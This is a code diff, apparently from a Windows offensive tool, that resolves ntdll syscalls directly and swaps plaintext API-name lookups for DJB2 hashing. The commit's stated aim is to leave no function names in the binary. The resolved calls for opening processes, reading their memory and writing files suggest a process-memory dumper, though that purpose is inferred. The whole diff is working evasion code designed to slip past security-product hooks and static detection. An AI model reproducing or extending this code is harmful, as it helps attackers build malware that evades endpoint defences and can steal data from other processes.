@@ -35,8 +35,16 @@ static PVOID get_ntdll_base(void) {
     return entry->DllBase;
 }
 
-// Find export by name in a PE module
-static PVOID get_export(PVOID module_base, const char *func_name) {
+// DJB2 hash — matches compile-time constants in syscalls.h
+static inline DWORD djb2_hash(const char *str) {
+    DWORD hash = 5381;
+    while (*str)
+        hash = ((hash << 5) + hash) + (unsigned char)*str++;
+    return hash;
+}
+
+// Find export by hash in a PE module (no plaintext function names)
+static PVOID get_export_by_hash(PVOID module_base, DWORD target_hash) {
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module_base;
     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)module_base + dos->e_lfanew);
     PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(
@@ -49,11 +57,7 @@ static PVOID get_export(PVOID module_base, const char *func_name) {
 
     for (DWORD i = 0; i < exports->NumberOfNames; i++) {
         const char *name = (const char *)((BYTE *)module_base + names[i]);
-        // Simple strcmp
-        const char *a = func_name;
-        const char *b = name;
-        while (*a && *b && *a == *b) { a++; b++; }
-        if (*a == 0 && *b == 0) {
+        if (djb2_hash(name) == target_hash) {
             return (BYTE *)module_base + functions[ordinals[i]];
         }
     }
@@ -111,9 +115,9 @@ static BOOL extract_ssn(BYTE *func_addr, DWORD *ssn_out, PVOID *syscall_addr_out
     return FALSE;
 }
 
-// Resolve a single syscall
-static BOOL resolve_one(PVOID ntdll, const char *name, DWORD *ssn, PVOID *addr) {
-    BYTE *func = (BYTE *)get_export(ntdll, name);
+// Resolve a single syscall by hash
+static BOOL resolve_one(PVOID ntdll, DWORD hash, DWORD *ssn, PVOID *addr) {
+    BYTE *func = (BYTE *)get_export_by_hash(ntdll, hash);
     if (!func) return FALSE;
     return extract_ssn(func, ssn, addr);
 }
@@ -123,14 +127,14 @@ BOOL resolve_syscalls(void) {
     if (!ntdll) return FALSE;
 
     BOOL ok = TRUE;
-    ok &= resolve_one(ntdll, "NtOpenProcess", &g_ssn.NtOpenProcess, &g_addr.NtOpenProcess);
-    ok &= resolve_one(ntdll, "NtClose", &g_ssn.NtClose, &g_addr.NtClose);
-    ok &= resolve_one(ntdll, "NtQueryVirtualMemory", &g_ssn.NtQueryVirtualMemory, &g_addr.NtQueryVirtualMemory);
-    ok &= resolve_one(ntdll, "NtReadVirtualMemory", &g_ssn.NtReadVirtualMemory, &g_addr.NtReadVirtualMemory);
-    ok &= resolve_one(ntdll, "NtQueryInformationProcess", &g_ssn.NtQueryInformationProcess, &g_addr.NtQueryInformationProcess);
-    ok &= resolve_one(ntdll, "NtCreateFile", &g_ssn.NtCreateFile, &g_addr.NtCreateFile);
-    ok &= resolve_one(ntdll, "NtWriteFile", &g_ssn.NtWriteFile, &g_addr.NtWriteFile);
-    ok &= resolve_one(ntdll, "NtQuerySystemInformation", &g_ssn.NtQuerySystemInformation, &g_addr.NtQuerySystemInformation);
+    ok &= resolve_one(ntdll, H_NtOpenProcess, &g_ssn.NtOpenProcess, &g_addr.NtOpenProcess);
+    ok &= resolve_one(ntdll, H_NtClose, &g_ssn.NtClose, &g_addr.NtClose);
+    ok &= resolve_one(ntdll, H_NtQueryVirtualMemory, &g_ssn.NtQueryVirtualMemory, &g_addr.NtQueryVirtualMemory);
+    ok &= resolve_one(ntdll, H_NtReadVirtualMemory, &g_ssn.NtReadVirtualMemory, &g_addr.NtReadVirtualMemory);
+    ok &= resolve_one(ntdll, H_NtQueryInformationProcess, &g_ssn.NtQueryInformationProcess, &g_addr.NtQueryInformationProcess);
+    ok &= resolve_one(ntdll, H_NtCreateFile, &g_ssn.NtCreateFile, &g_addr.NtCreateFile);
+    ok &= resolve_one(ntdll, H_NtWriteFile, &g_ssn.NtWriteFile, &g_addr.NtWriteFile);
+    ok &= resolve_one(ntdll, H_NtQuerySystemInformation, &g_ssn.NtQuerySystemInformation, &g_addr.NtQuerySystemInformation);
 
     return ok;
 }
